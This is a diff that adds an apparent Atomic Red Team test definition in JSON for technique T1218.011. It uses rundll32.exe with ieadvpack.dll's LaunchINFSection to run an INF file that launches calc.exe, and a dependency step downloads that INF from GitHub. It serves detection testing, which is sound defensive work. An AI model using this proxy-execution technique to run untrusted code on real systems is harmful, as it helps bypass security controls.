@@ -1,0 +1,86 @@
+{
+  "id": "5e46a58e-cbf6-45ef-a289-ed7754603df9",
+  "name": "Rundll32 ieadvpack.dll Execution",
+  "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "926560f0-e10e-478b-be89-fc527215bae6",
+      "type": "execute-command",
+      "data": {
+        "command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "30d447e1-a410-40ca-b6c8-1ec8a80943f8",
+      "name": "Check dependency 1/1",
+      "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "daf3036b-c5fe-45e5-b936-500c24a38d88",
+      "name": "Resolve dependency 1/1",
+      "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "90e1452d-07b3-4049-accd-0819e772cb9c",
+      "name": "Re-check dependency 1/1",
+      "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "30d447e1-a410-40ca-b6c8-1ec8a80943f8",
+      "p": "on-success",
+      "o": "926560f0-e10e-478b-be89-fc527215bae6"
+    },
+    {
+      "s": "30d447e1-a410-40ca-b6c8-1ec8a80943f8",
+      "p": "on-failure",
+      "o": "daf3036b-c5fe-45e5-b936-500c24a38d88"
+    },
+    {
+      "s": "daf3036b-c5fe-45e5-b936-500c24a38d88",
+      "p": "on-success",
+      "o": "90e1452d-07b3-4049-accd-0819e772cb9c"
+    },
+    {
+      "s": "90e1452d-07b3-4049-accd-0819e772cb9c",
+      "p": "on-failure",
+      "o": "926560f0-e10e-478b-be89-fc527215bae6"
+    }
+  ],
+  "tags": [
+    "T1218.011",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "inf_to_execute",
+      "type": "string",
+      "description": "Local location of inf file",
+      "value": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"
+    }
+  ]
+}
